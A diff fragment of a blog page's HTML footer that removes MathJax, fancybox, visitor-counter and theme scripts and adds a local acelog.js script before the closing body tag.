-<script type="text/x-mathjax-config">
-  MathJax.Hub.Config({
-    tex2jax: {
-      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
-      processEscapes: true
-    }
-  });
-</script>
-
-<script type="text/x-mathjax-config">
-    MathJax.Hub.Config({
-      tex2jax: {
-        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
-      }
-    });
-</script>
-
-<script type="text/x-mathjax-config">
-    MathJax.Hub.Queue(function() {
-        var all = MathJax.Hub.getAllJax(), i;
-        for(i=0; i < all.length; i += 1) {
-            all[i].SourceElement().parentNode.className += ' has-jax';
-        }
-    });
-</script>
-
-<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
-</script>
-
-
-  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
-  <script src="/fancybox/jquery.fancybox.pack.js"></script>
-
-
-<script src="/js/script.js"></script>
-<script src="/js/bootstrap.js"></script>
-<script src="/js/main.js"></script>
-
-
-
-
-
-
-
-
-	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-
-
-
-
-
-
-  </div>
-
-  <a id="rocket" href="#top" class=""></a>
-  <script type="text/javascript" src="/js/totop.js" async=""></script>
-</body>
+        <script type="text/javascript" async="async" src="/javascripts/acelog.js"></script>
+        
+        
+        
+    </body>
 </html>
+        
